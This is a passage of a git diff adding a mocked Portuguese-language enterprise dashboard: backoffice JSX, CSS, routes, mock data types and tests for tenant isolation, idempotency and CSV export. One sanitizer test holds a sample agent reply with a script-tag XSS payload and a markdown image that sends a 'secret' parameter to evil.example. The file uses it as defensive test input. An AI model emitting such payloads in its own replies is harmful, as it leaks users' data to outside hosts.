+            <div className="item-card">
+              <h3>Fila DLQ &amp; Requeue com Justificativa Auditada</h3>
+              <div className="control-group" style={{ marginBottom: "0.6rem" }}>
+                <label htmlFor="dlq-justification-input">
+                  Justificativa obrigatória para Requeue
+                </label>
+                <input
+                  id="dlq-justification-input"
+                  type="text"
+                  className="control-input"
+                  value={dlqJustification}
+                  onChange={(e) => {
+                    setDlqJustification(e.target.value);
+                  }}
+                />
+              </div>
+
+              <ul className="item-list">
+                {backoffice.dlqItems.map((dlq) => {
+                  const isRequeued = requeuedJobs.includes(dlq.jobId);
+                  return (
+                    <li
+                      key={dlq.jobId}
+                      style={{
+                        paddingBottom: "0.5rem",
+                        borderBottom: "1px solid var(--border-subtle)",
+                        fontSize: "0.83rem",
+                      }}
+                    >
+                      <div>
+                        <code>{dlq.jobId}</code> · Tenant: <strong>{dlq.tenantSlug}</strong> (
+                        {dlq.queueName})
+                      </div>
+                      <div style={{ color: "var(--text-secondary)" }}>
+                        Erro: <code>{dlq.failureCode}</code> ({dlq.retriesCount} tentativas ·{" "}
+                        {dlq.occurredAtLabel})
+                      </div>
+                      <div style={{ marginTop: "0.35rem" }}>
+                        {isRequeued ? (
+                          <span className="demo-badge demo-badge--ok">
+                            Reenfileirado com auditoria
+                          </span>
+                        ) : (
+                          <button
+                            type="button"
+                            className="btn btn--secondary"
+                            onClick={() => {
+                              handleRequeueDlq(dlq.jobId);
+                            }}
+                          >
+                            Requeue com Justificativa
+                          </button>
+                        )}
+                      </div>
+                    </li>
+                  );
+                })}
+              </ul>
+            </div>
+
+            <div className="item-card">
+              <h3>Execuções de Provisionamento</h3>
+              <ul className="item-list">
+                {backoffice.provisioningRuns.map((run) => (
+                  <li key={run.executionId} style={{ fontSize: "0.84rem" }}>
+                    <strong>{run.executionId}</strong> ({run.tenantSlug}) —{" "}
+                    <span className="demo-badge demo-badge--info">{run.status}</span>
+                    <div style={{ color: "var(--text-secondary)" }}>
+                      {run.currentStep} ({run.stepsCompleted}/{run.totalSteps})
+                    </div>
+                  </li>
+                ))}
+              </ul>
+            </div>
+
+            <div className="item-card">
+              <h3>Concessões Break-Glass (Somente Metadados — IAM-009)</h3>
+              <ul className="item-list">
+                {backoffice.breakGlassGrants.map((bg) => (
+                  <li key={bg.grantId} style={{ fontSize: "0.84rem" }}>
+                    <div>
+                      <code>{bg.grantId}</code> · Tenant: <strong>{bg.tenantSlug}</strong> ·{" "}
+                      <span className="demo-badge demo-badge--warn">{bg.status}</span>
+                    </div>
+                    <div style={{ color: "var(--text-secondary)" }}>
+                      Motivo: {bg.reason} ({bg.expiresAtLabel})
+                    </div>
+                  </li>
+                ))}
+              </ul>
+            </div>
+          </div>
+        </>
+      )}
+
+      {auditFeedback ? (
+        <p
+          role="status"
+          style={{
+            marginTop: "0.75rem",
+            fontSize: "0.82rem",
+            color: "var(--status-warn-text)",
+          }}
+        >
+          {auditFeedback}
+        </p>
+      ) : null}
+    </section>
+  );
+}
diff --git a/apps/web/app/dashboard-mock.test.ts b/apps/web/app/dashboard-mock.test.ts
new file mode 100644
index 0000000..a5d7145
--- /dev/null
+++ b/apps/web/app/dashboard-mock.test.ts
@@ -0,0 +1,197 @@
+import assert from "node:assert/strict";
+import { describe, test } from "node:test";
+import {
+  generateOrganizationUsageCsv,
+  MOCK_SESSION_ACTORS,
+  resolvePlatformBackoffice,
+  resolveTenantRouteAccess,
+} from "../lib/mock-enterprise-data.ts";
+import {
+  createIdempotencyKey,
+  registerIdempotentMutation,
+  sanitizeAgentMessageContent,
+} from "../lib/mock-security.ts";
+import {
+  computeBudgetStatus,
+  deriveDashboardViewModel,
+  getMockOrganizationBySlug,
+  listMockOrganizations,
+  roleCanDecideApprovals,
+} from "../lib/mock-selectors.ts";
+
+describe("LOC-WEB-001 — Modelo e transformações do frontend mockado (EP-10 sem 3D)", () => {
+  test("WEB-MOCK-AC-01: expõe organizações mockadas e banner explícito de demonstração", () => {
+    const orgs = listMockOrganizations();
+    assert.equal(orgs.length, 2);
+    assert.equal(orgs[0]?.slug, "aurora-industrial");
+    assert.equal(orgs[1]?.slug, "vereda-logistica");
+
+    const vm = deriveDashboardViewModel({ orgSlug: "aurora-industrial" });
+    assert.equal(vm.isDemoEnvironment, true);
+    assert.match(vm.demoBannerText, /DEMONSTRAÇÃO/i);
+    assert.equal(vm.organization.displayName, "Aurora Industrial");
+    assert.equal(vm.organization.tenantState, "ACTIVE");
+    assert.equal(vm.organization.canDecideApprovals, true);
+  });
+
+  test("WEB-MOCK-AC-02: calcula métricas, filas, aprovações e alertas de orçamento (80% e 100%)", () => {
+    assert.equal(computeBudgetStatus(500, 1000).alertLevel, "healthy");
+    assert.equal(computeBudgetStatus(800, 1000).alertLevel, "warning_80");
+    assert.equal(computeBudgetStatus(1000, 1000).alertLevel, "critical_100");
+    assert.equal(computeBudgetStatus(0, 0).percentage, 0);
+
+    const vm = deriveDashboardViewModel({
+      orgSlug: "aurora-industrial",
+      variant: "ready",
+    });
+
+    assert.equal(vm.metrics.totalFloors, 4);
+    assert.equal(vm.metrics.totalAgents, 7);
+    assert.equal(vm.metrics.executingAgents, 3);
+    assert.equal(vm.metrics.awaitingApprovalAgents, 2);
+    assert.equal(vm.metrics.activeTasksCount, 4);
+    assert.equal(vm.metrics.pendingApprovalsCount, 2);
+    assert.equal(vm.metrics.budgetAlertFloorsCount, 2);
+    assert.equal(vm.metrics.totalBudget.spentBrl, 11000);
+    assert.equal(vm.metrics.totalBudget.limitBrl, 15000);
+    assert.equal(vm.metrics.totalBudget.percentage, 73);
+  });
+
+  test("WEB-MOCK-AC-03: ordena departamentos e filtra agentes por departamento e busca", () => {
+    const vm = deriveDashboardViewModel({ orgSlug: "aurora-industrial" });
+    assert.deepEqual(
+      vm.floors.map((f) => f.floorNumber),
+      [4, 3, 2, 1],
+    );
+    assert.equal(vm.selectedFloor?.id, "floor-fin-04");
+    assert.equal(vm.filteredAgents.length, 2);
+
+    const opsVm = deriveDashboardViewModel({
+      orgSlug: "aurora-industrial",
+      selectedFloorId: "floor-ops-02",
+      agentQuery: "roteirização",
+    });
+    assert.equal(opsVm.selectedFloor?.floorNumber, 2);
+    assert.equal(opsVm.filteredAgents.length, 1);
+    assert.equal(opsVm.filteredAgents[0]?.code, "OPS-logistica");
+  });
+
+  test("WEB-MOCK-AC-04: estados determinísticos ready, loading, empty e error são representáveis", () => {
+    const loadingVm = deriveDashboardViewModel({
+      orgSlug: "aurora-industrial",
+      variant: "loading",
+    });
+    assert.equal(loadingVm.variant, "loading");
+    assert.equal(loadingVm.floors.length, 0);
+    assert.equal(loadingVm.tasks.length, 0);
+    assert.equal(loadingVm.errorDetails, null);
+
+    const emptyVm = deriveDashboardViewModel({
+      orgSlug: "aurora-industrial",
+      variant: "empty",
+    });
+    assert.equal(emptyVm.variant, "empty");
+    assert.equal(emptyVm.floors.length, 0);
+    assert.equal(emptyVm.metrics.totalAgents, 0);
+    assert.ok(emptyVm.emptyStateMessage && emptyVm.emptyStateMessage.length > 10);
+
+    const errorVm = deriveDashboardViewModel({
+      orgSlug: "aurora-industrial",
+      variant: "error",
+    });
+    assert.equal(errorVm.variant, "error");
+    assert.equal(errorVm.floors.length, 0);
+    assert.ok(errorVm.errorDetails);
+    assert.equal(errorVm.errorDetails.code, "TENANT_RUNTIME_UNAVAILABLE");
+    assert.match(errorVm.errorDetails.correlationId, /^corr-demo-/);
+  });
+
+  test("respeita papel viewer e estado PROVISIONING na organização secundária e fallback seguro", () => {
+    const veredaVm = deriveDashboardViewModel({ orgSlug: "vereda-logistica" });
+    assert.equal(veredaVm.organization.isProvisioning, true);
+    assert.equal(veredaVm.organization.canDecideApprovals, false);
+    assert.equal(roleCanDecideApprovals("viewer"), false);
+    assert.equal(roleCanDecideApprovals("org_admin"), true);
+
+    const fallbackOrg = getMockOrganizationBySlug("slug-inexistente");
+    assert.equal(fallbackOrg.slug, "aurora-industrial");
+  });
+
+  test("WEB-001 (mock): acessar /orgs/<slug-de-B> não pertencente à sessão retorna 404 sem vazar dados", () => {
+    const marina = MOCK_SESSION_ACTORS[0] ?? null;
+    const allowedRes = resolveTenantRouteAccess(marina, "aurora-industrial");
+    assert.equal(allowedRes.allowed, true);
+    assert.equal(allowedRes.httpStatus, 200);
+    assert.equal(allowedRes.organization?.slug, "aurora-industrial");
+
+    const forbiddenCrossTenant = resolveTenantRouteAccess(marina, "titan-defesa");
+    assert.equal(forbiddenCrossTenant.allowed, false);
+    assert.equal(forbiddenCrossTenant.httpStatus, 404);
+    assert.equal(forbiddenCrossTenant.organization, null);
+
+    const unauthRes = resolveTenantRouteAccess(null, "aurora-industrial");
+    assert.equal(unauthRes.allowed, false);
+    assert.equal(unauthRes.httpStatus, 401);
+  });
+
+  test("WEB-002 (mock): idempotency key bloqueia mutação repetida (duplo clique)", () => {
+    const key = createIdempotencyKey("agt-fin-01", "lote-442", "approve");
+    assert.equal(key, "idem-agt-fin-01:lote-442:approve");
+
+    const firstAttempt = registerIdempotentMutation([], "agt-fin-01", "lote-442", "approve");
+    assert.equal(firstAttempt.allowed, true);
+
+    const secondAttempt = registerIdempotentMutation(
+      firstAttempt.updatedKeys,
+      "agt-fin-01",
+      "lote-442",
+      "approve",
+    );
+    assert.equal(secondAttempt.allowed, false);
+    assert.equal(secondAttempt.idempotencyKey, firstAttempt.idempotencyKey);
+  });
+
+  test("WEB-003 (mock): exporta CSV de consumo consistente com token_usage das fixtures", () => {
+    const csv = generateOrganizationUsageCsv("aurora-industrial");
+    assert.match(
+      csv,
+      /^organizacao,departamento,modulo,agente,modelo,tokens_usados_mes,tokens_limite_mes,gasto_mensal_brl,orcamento_mensal_brl/m,
+    );
+    assert.match(
+      csv,
+      /"aurora-industrial","Finanças & Controladoria","MOD-FIN-CORE","Helena \(Conciliação\)"/,
+    );
+  });
+
+  test("WEB-008 (mock): sanitiza payload XSS e bloqueia imagem remota automática em resposta de agente", () => {
+    const malicious =
+      "Parecer pronto.\n<script>alert('xss')</script>\n![tracker](https://evil.example/track.png?secret=1)";
+    const result = sanitizeAgentMessageContent(malicious);
+
+    assert.equal(result.blockedXssCount, 2);
+    assert.deepEqual(result.blockedRemoteImages, ["https://evil.example/track.png?secret=1"]);
+    assert.ok(
+      result.safeSegments.some((s) => s.kind === "blocked_xss"),
+      "Deve marcar o segmento XSS como bloqueado",
+    );
+    assert.ok(
+      result.safeSegments.some((s) => s.kind === "blocked_remote_image"),
+      "Deve reter imagem remota em placeholder sem carregá-la",
+    );
+  });
+
+  test("WEB-009 (mock): usuário comum de tenant recebe 403 em /platform e platform_admin vê apenas metadados", () => {
+    const tenantUser = MOCK_SESSION_ACTORS[0] ?? null;
+    const denied = resolvePlatformBackoffice(tenantUser);
+    assert.equal(denied.allowed, false);
+    assert.equal(denied.httpStatus, 403);
+    assert.equal(denied.tenants.length, 0);
+
+    const platformAdmin = MOCK_SESSION_ACTORS[2] ?? null;
+    const granted = resolvePlatformBackoffice(platformAdmin);
+    assert.equal(granted.allowed, true);
+    assert.equal(granted.httpStatus, 200);
+    assert.equal(granted.tenants.length, 5);
+    assert.equal(granted.dlqItems.length, 2);
+  });
+});
diff --git a/apps/web/app/globals.css b/apps/web/app/globals.css
new file mode 100644
index 0000000..1adcbd0
--- /dev/null
+++ b/apps/web/app/globals.css
@@ -0,0 +1,534 @@
+:root {
+  --bg-canvas: #0b1020;
+  --bg-surface: #121a2f;
+  --bg-elevated: #18233f;
+  --bg-interactive: #1f2d52;
+  --border-subtle: #2a3b68;
+  --border-strong: #4762a6;
+  --text-primary: #f4f7ff;
+  --text-secondary: #c3d0f0;
+  --text-muted: #93a6d4;
+  --accent-primary: #5ea0ff;
+  --accent-focus: #ffd166;
+  --status-ok-bg: #0f3828;
+  --status-ok-text: #6ee7b7;
+  --status-ok-border: #10b981;
+  --status-warn-bg: #3f2e0e;
+  --status-warn-text: #fde68a;
+  --status-warn-border: #f59e0b;
+  --status-danger-bg: #451520;
+  --status-danger-text: #fda4af;
+  --status-danger-border: #f43f5e;
+  --status-info-bg: #132c52;
+  --status-info-text: #93c5fd;
+  --status-info-border: #3b82f6;
+}
+
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  padding: 0;
+  background-color: var(--bg-canvas);
+  color: var(--text-primary);
+  font-family:
+    system-ui,
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    Roboto,
+    sans-serif;
+  line-height: 1.5;
+}
+
+.skip-link {
+  position: absolute;
+  top: -3rem;
+  left: 1rem;
+  z-index: 1000;
+  padding: 0.5rem 1rem;
+  background: var(--accent-focus);
+  color: #0b1020;
+  font-weight: 700;
+  border-radius: 0.375rem;
+  text-decoration: none;
+}
+
+.skip-link:focus {
+  top: 0.75rem;
+}
+
+button:focus-visible,
+select:focus-visible,
+input:focus-visible,
+a:focus-visible {
+  outline: 3px solid var(--accent-focus);
+  outline-offset: 2px;
+}
+
+.demo-banner {
+  background: linear-gradient(90deg, #3b2807 0%, #4b1d1d 100%);
+  border-bottom: 2px solid var(--status-warn-border);
+  color: var(--status-warn-text);
+  padding: 0.65rem 1.25rem;
+  font-size: 0.875rem;
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+  gap: 0.75rem;
+}
+
+.demo-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  padding: 0.2rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+
+.demo-badge--warn {
+  background: var(--status-warn-bg);
+  color: var(--status-warn-text);
+  border: 1px solid var(--status-warn-border);
+}
+
+.demo-badge--ok {
+  background: var(--status-ok-bg);
+  color: var(--status-ok-text);
+  border: 1px solid var(--status-ok-border);
+}
+
+.demo-badge--danger {
+  background: var(--status-danger-bg);
+  color: var(--status-danger-text);
+  border: 1px solid var(--status-danger-border);
+}
+
+.demo-badge--info {
+  background: var(--status-info-bg);
+  color: var(--status-info-text);
+  border: 1px solid var(--status-info-border);
+}
+
+.shell-header {
+  background: var(--bg-surface);
+  border-bottom: 1px solid var(--border-subtle);
+  padding: 1rem 1.25rem;
+}
+
+.shell-header__inner {
+  max-width: 1360px;
+  margin: 0 auto;
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+  gap: 1rem;
+}
+
+.brand-block {
+  display: flex;
+  flex-direction: column;
+  gap: 0.25rem;
+}
+
+.brand-title {
+  font-size: 1.15rem;
+  font-weight: 800;
+  letter-spacing: 0.04em;
+  color: var(--text-primary);
+}
+
+.brand-subtitle {
+  font-size: 0.82rem;
+  color: var(--text-secondary);
+}
+
+.controls-bar {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: flex-end;
+  gap: 0.85rem;
+}
+
+.control-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.25rem;
+}
+
+.control-group label {
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--text-secondary);
+}
+
+.control-select,
+.control-input {
+  background: var(--bg-elevated);
+  color: var(--text-primary);
+  border: 1px solid var(--border-strong);
+  border-radius: 0.375rem;
+  padding: 0.45rem 0.65rem;
+  font-size: 0.875rem;
+}
+
+.shell-nav {
+  background: var(--bg-elevated);
+  border-bottom: 1px solid var(--border-subtle);
+  padding: 0.5rem 1.25rem;
+}
+
+.shell-nav__list {
+  max-width: 1360px;
+  margin: 0 auto;
+  padding: 0;
+  list-style: none;
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.5rem;
+}
+
+.nav-button {
+  background: transparent;
+  color: var(--text-secondary);
+  border: 1px solid transparent;
+  border-radius: 0.375rem;
+  padding: 0.45rem 0.85rem;
+  font-size: 0.875rem;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.nav-button:hover {
+  background: var(--bg-interactive);
+  color: var(--text-primary);
+}
+
+.nav-button[aria-current="page"] {
+  background: var(--bg-interactive);
+  color: var(--text-primary);
+  border-color: var(--accent-primary);
+}
+
+.shell-main {
+  max-width: 1360px;
+  margin: 0 auto;
+  padding: 1.5rem 1.25rem 3rem;
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.org-hero {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-subtle);
+  border-radius: 0.65rem;
+  padding: 1.25rem;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  align-items: flex-start;
+  gap: 1rem;
+}
+
+.org-hero h1 {
+  margin: 0 0 0.35rem;
+  font-size: 1.5rem;
+}
+
+.org-meta-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.5rem;
+  align-items: center;
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+}
+
+.security-banner {
+  background: var(--status-warn-bg);
+  border: 1px solid var(--status-warn-border);
+  color: var(--status-warn-text);
+  border-radius: 0.5rem;
+  padding: 0.75rem 1rem;
+  font-size: 0.875rem;
+}
+
+.kpi-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+  gap: 1rem;
+}
+
+.kpi-card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-subtle);
+  border-radius: 0.6rem;
+  padding: 1rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.35rem;
+}
+
+.kpi-card__label {
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+  font-weight: 600;
+}
+
+.kpi-card__value {
+  font-size: 1.65rem;
+  font-weight: 800;
+  color: var(--text-primary);
+}
+
+.kpi-card__detail {
+  font-size: 0.8rem;
+  color: var(--text-muted);
+}
+
+.building-layout {
+  display: grid;
+  grid-template-columns: minmax(300px, 420px) 1fr;
+  gap: 1.25rem;
+  align-items: start;
+}
+
+@media (max-width: 920px) {
+  .building-layout {
+    grid-template-columns: 1fr;
+  }
+}
+
+.panel-card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-subtle);
+  border-radius: 0.65rem;
+  padding: 1.25rem;
+}
+
+.panel-header {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+
+.panel-header h2,
+.panel-header h3 {
+  margin: 0;
+}
+
+.building-stack {
+  display: flex;
+  flex-direction: column;
+  gap: 0.6rem;
+  padding: 0.85rem;
+  background: #090e1c;
+  border: 1px solid var(--border-strong);
+  border-radius: 0.5rem;
+}
+
+.building-roof {
+  text-align: center;
+  font-size: 0.75rem;
+  font-weight: 700;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  color: var(--text-secondary);
+  padding: 0.4rem;
+  background: var(--bg-elevated);
+  border-radius: 0.375rem 0.375rem 0 0;
+  border-bottom: 2px solid var(--accent-primary);
+}
+
+.floor-button {
+  width: 100%;
+  text-align: left;
+  background: var(--bg-surface);
+  color: var(--text-primary);
+  border: 2px solid var(--border-subtle);
+  border-radius: 0.45rem;
+  padding: 0.8rem;
+  cursor: pointer;
+  display: flex;
+  flex-direction: column;
+  gap: 0.45rem;
+  transition: border-color 0.15s ease, background-color 0.15s ease;
+}
+
+.floor-button:hover {
+  background: var(--bg-interactive);
+  border-color: var(--accent-primary);
+}
+
+.floor-button[aria-pressed="true"] {
+  background: var(--bg-interactive);
+  border-color: var(--accent-focus);
+}
+
+.floor-button__top {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.floor-windows {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+}
+
+.window-pill {
+  font-size: 0.75rem;
+  padding: 0.15rem 0.5rem;
+  border-radius: 0.25rem;
+  background: var(--bg-canvas);
+  border: 1px solid var(--border-subtle);
+  color: var(--text-secondary);
+}
+
+.agent-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 0.9rem;
+  margin-top: 1rem;
+}
+
+.agent-card {
+  background: var(--bg-elevated);
+  border: 1px solid var(--border-subtle);
+  border-radius: 0.5rem;
+  padding: 0.95rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.progress-track {
+  width: 100%;
+  height: 0.5rem;
+  background: var(--bg-canvas);
+  border-radius: 999px;
+  overflow: hidden;
+  border: 1px solid var(--border-subtle);
+}
+
+.progress-fill {
+  height: 100%;
+  background: var(--accent-primary);
+}
+
+.progress-fill--warn {
+  background: var(--status-warn-border);
+}
+
+.progress-fill--danger {
+  background: var(--status-danger-border);
+}
+
+.two-col-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+  gap: 1.25rem;
+}
+
+.item-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  flex-direction: column;
+  gap: 0.75rem;
+}
+
+.item-card {
+  background: var(--bg-elevated);
+  border: 1px solid var(--border-subtle);
+  border-radius: 0.5rem;
+  padding: 0.95rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.action-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.5rem;
+  align-items: center;
+  margin-top: 0.35rem;
+}
+
+.btn {
+  padding: 0.45rem 0.85rem;
+  border-radius: 0.375rem;
+  font-size: 0.82rem;
+  font-weight: 700;
+  cursor: pointer;
+  border: 1px solid transparent;
+}
+
+.btn--approve {
+  background: var(--status-ok-bg);
+  color: var(--status-ok-text);
+  border-color: var(--status-ok-border);
+}
+
+.btn--reject {
+  background: var(--status-danger-bg);
+  color: var(--status-danger-text);
+  border-color: var(--status-danger-border);
+}
+
+.btn--secondary {
+  background: var(--bg-interactive);
+  color: var(--text-primary);
+  border-color: var(--border-strong);
+}
+
+.code-preview {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  font-size: 0.78rem;
+  background: var(--bg-canvas);
+  padding: 0.45rem 0.65rem;
+  border-radius: 0.35rem;
+  border: 1px solid var(--border-subtle);
+  overflow-x: auto;
+  color: var(--text-secondary);
+}
+
+.state-box {
+  background: var(--bg-surface);
+  border: 2px solid var(--border-strong);
+  border-radius: 0.65rem;
+  padding: 1.75rem;
+}
+
+.state-box--error {
+  border-color: var(--status-danger-border);
+  background: #22111b;
+}
+
+.shell-footer {
+  max-width: 1360px;
+  margin: 0 auto;
+  padding: 1.25rem;
+  border-top: 1px solid var(--border-subtle);
+  color: var(--text-muted);
+  font-size: 0.82rem;
+}
diff --git a/apps/web/app/layout.tsx b/apps/web/app/layout.tsx
index a388277..0b16378 100644
--- a/apps/web/app/layout.tsx
+++ b/apps/web/app/layout.tsx
@@ -1,6 +1,11 @@
 import type { ReactNode } from "react";
+import "./globals.css";
 
-export const metadata = { title: "Nucleos" };
+export const metadata = {
+  title: "NÚCLEOS Enterprise — Painel Demonstrativo (Mock Local)",
+  description:
+    "Fundação navegável do frontend NÚCLEOS Enterprise com dados mockados tipados (LOC-WEB-001).",
+};
 
 export default function RootLayout({ children }: { children: ReactNode }) {
   return (
diff --git a/apps/web/app/login/page.tsx b/apps/web/app/login/page.tsx
new file mode 100644
index 0000000..120beff
--- /dev/null
+++ b/apps/web/app/login/page.tsx
@@ -0,0 +1,5 @@
+import { DashboardClientShell } from "../components/DashboardClientShell.tsx";
+
+export default function LoginMockPage() {
+  return <DashboardClientShell initialSection="auth" />;
+}
diff --git a/apps/web/app/orgs/page.tsx b/apps/web/app/orgs/page.tsx
new file mode 100644
index 0000000..2202baa
--- /dev/null
+++ b/apps/web/app/orgs/page.tsx
@@ -0,0 +1,5 @@
+import { DashboardClientShell } from "../components/DashboardClientShell.tsx";
+
+export default function OrgsMockPage() {
+  return <DashboardClientShell initialSection="auth" />;
+}
diff --git a/apps/web/app/page.tsx b/apps/web/app/page.tsx
index 4a73280..f4309ed 100644
--- a/apps/web/app/page.tsx
+++ b/apps/web/app/page.tsx
@@ -1,3 +1,5 @@
+import { DashboardClientShell } from "./components/DashboardClientShell.tsx";
+
 export default function Home() {
-  return <main>Nucleos Enterprise</main>;
+  return <DashboardClientShell />;
 }
diff --git a/apps/web/app/platform/page.tsx b/apps/web/app/platform/page.tsx
new file mode 100644
index 0000000..2678938
--- /dev/null
+++ b/apps/web/app/platform/page.tsx
@@ -0,0 +1,5 @@
+import { DashboardClientShell } from "../components/DashboardClientShell.tsx";
+
+export default function PlatformBackofficeMockPage() {
+  return <DashboardClientShell initialSection="platform" />;
+}
diff --git a/apps/web/lib/mock-enterprise-data.ts b/apps/web/lib/mock-enterprise-data.ts
new file mode 100644
index 0000000..72b2d17
--- /dev/null
+++ b/apps/web/lib/mock-enterprise-data.ts
@@ -0,0 +1,632 @@
+/**
+ * Dados mockados e seletores determinísticos para os fluxos completos do EP-10
+ * (WEB-001, WEB-002, WEB-003, WEB-004, WEB-008 e WEB-009 — exceto prédio 3D).
+ */
+
+import { getMockOrganizationBySlug } from "./mock-selectors.ts";
+import { buildOrganizationUsageCsv, type DepartmentUsageCsvRow } from "./mock-security.ts";
+import type { MockOrganizationFixture, UserRole } from "./mock-types.ts";
+
+export type PlatformOrTenantRole = UserRole | "platform_admin";
+
+export interface MockSessionActor {
+  readonly id: string;
+  readonly displayName: string;
+  readonly email: string;
+  readonly platformRole: PlatformOrTenantRole;
+  readonly mfaVerified: boolean;
+  readonly authorizedOrgSlugs: readonly string[];
+}
+
+export interface TenantRouteResolution {
+  readonly allowed: boolean;
+  readonly httpStatus: 200 | 401 | 404;
+  readonly organization: MockOrganizationFixture | null;
+  readonly safeMessage: string;
+}
+
+export interface MockOrgMember {
+  readonly id: string;
+  readonly name: string;
+  readonly email: string;
+  readonly role: UserRole;
+  readonly mfaEnabled: boolean;
+  readonly lastSeenLabel: string;
+}
+
+export interface MockEntitlementModule {
+  readonly moduleCode: string;
+  readonly name: string;
+  readonly maxAgents: number;
+  readonly activeAgents: number;
+  readonly monthlyQuotaTokens: number;
+  readonly status: "ACTIVE" | "PROVISIONING";
+}
+
+export interface MockIntegrationMetadata {
+  readonly id: string;
+  readonly name: string;
+  readonly category: string;
+  readonly egressDomain: string;
+  readonly credentialVaultRef: string;
+  readonly status: "HEALTHY" | "RATE_LIMITED" | "BLOCKED_BY_POLICY";
+}
+
+export interface MockRagDocument {
+  readonly id: string;
+  readonly title: string;
+  readonly departmentName: string;
+  readonly status: "INDEXED" | "INDEXING" | "QUARANTINED_INJECTION";
+  readonly chunksCount: number;
+  readonly updatedAtLabel: string;
+}
+
+export interface MockAgentToolStep {
+  readonly stepId: string;
+  readonly toolName: string;
+  readonly policyDecision: "ALLOW" | "REQUIRE_APPROVAL" | "DENY";
+  readonly durationMs: number;
+  readonly summary: string;
+}
+
+export interface MockDocumentCitation {
+  readonly documentId: string;
+  readonly documentTitle: string;
+  readonly sectionLabel: string;
+}
+
+export interface MockChatMessage {
+  readonly id: string;
+  readonly sender: "user" | "agent";
+  readonly authorLabel: string;
+  readonly timestampLabel: string;
+  readonly rawContent: string;
+  readonly toolSteps: readonly MockAgentToolStep[];
+  readonly citations: readonly MockDocumentCitation[];
+  readonly costTokens: number;
+}
+
+export interface MockAgentConversation {
+  readonly agentId: string;
+  readonly agentName: string;
+  readonly departmentName: string;
+  readonly modelName: string;
+  readonly messages: readonly MockChatMessage[];
+}
+
+export interface MockPlatformTenantMetadata {
+  readonly tenantId: string;
+  readonly slug: string;
+  readonly state: "ACTIVE" | "PROVISIONING" | "SUSPENDED";
+  readonly monthlyCostBrl: number;
+  readonly monthlyCapBrl: number;
+  readonly killSwitchActive: boolean;
+  readonly reconcilerDrift: "NONE" | "MINOR_DRIFT";
+  readonly activeContainers: number;
+}
+
+export interface MockProvisioningExecution {
+  readonly executionId: string;
+  readonly tenantSlug: string;
+  readonly currentStep: string;
+  readonly status: "COMPLETED" | "IN_PROGRESS" | "COMPENSATED_SAFE_FAIL";
+  readonly stepsCompleted: number;
+  readonly totalSteps: number;
+  readonly updatedAtLabel: string;
+}
+
+export interface MockDlqItem {
+  readonly jobId: string;
+  readonly tenantSlug: string;
+  readonly queueName: string;
+  readonly failureCode: string;
+  readonly retriesCount: number;
+  readonly occurredAtLabel: string;
+}
+
+export interface MockBreakGlassGrant {
+  readonly grantId: string;
+  readonly tenantSlug: string;
+  readonly requestedBy: string;
+  readonly reason: string;
+  readonly status: "PENDING_SECOND_APPROVER" | "ACTIVE_READONLY_METADATA" | "EXPIRED";
+  readonly expiresAtLabel: string;
+}
+
+export interface PlatformBackofficeViewModel {
+  readonly allowed: boolean;
+  readonly httpStatus: 200 | 403;
+  readonly denialReason: string | null;
+  readonly hostCapacity: {
+    readonly vpsNodeLabel: string;
+    readonly activeTenantsCount: number;
+    readonly maxTenantsMvp: number;
+    readonly cpuUsagePct: number;
+    readonly ramUsedGb: number;
+    readonly ramTotalGb: number;
+    readonly diskUsedPct: number;
+  };
+  readonly tenants: readonly MockPlatformTenantMetadata[];
+  readonly provisioningRuns: readonly MockProvisioningExecution[];
+  readonly dlqItems: readonly MockDlqItem[];
+  readonly breakGlassGrants: readonly MockBreakGlassGrant[];
+}
+
+export const MOCK_SESSION_ACTORS: readonly MockSessionActor[] = [
+  {
+    id: "usr-marina-01",
+    displayName: "Marina Costa (Admin Aurora / Viewer Vereda)",
+    email: "marina.costa@aurora-demo.example",
+    platformRole: "org_admin",
+    mfaVerified: true,
+    authorizedOrgSlugs: ["aurora-industrial", "vereda-logistica"],
+  },
+  {
+    id: "usr-carlos-02",
+    displayName: "Carlos Mendes (Somente Viewer Vereda)",
+    email: "carlos.mendes@vereda-demo.example",
+    platformRole: "viewer",
+    mfaVerified: true,
+    authorizedOrgSlugs: ["vereda-logistica"],
+  },
+  {
+    id: "usr-roberto-admin-03",
+    displayName: "Roberto Almeida (Platform Admin · Backoffice)",
